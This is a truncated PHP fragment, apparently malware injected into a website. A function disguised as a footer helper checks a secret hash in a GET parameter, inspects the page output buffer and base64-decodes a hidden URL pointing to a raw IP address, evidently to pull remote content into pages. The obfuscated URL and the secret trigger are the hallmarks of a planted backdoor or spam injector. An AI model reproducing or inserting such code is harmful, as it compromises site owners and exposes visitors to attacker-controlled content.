...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '4929f9b74e11d512640a3228cc010e82') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
        $url = base64_decode('aHR0cDovLzEwOC42MS4xMTcuMjQ0L2Jsb2cvP3ZlbnVzJnV0bV9zb3VyY2U9NjgwMDM6MjM1MDA0OjM5Nw==');
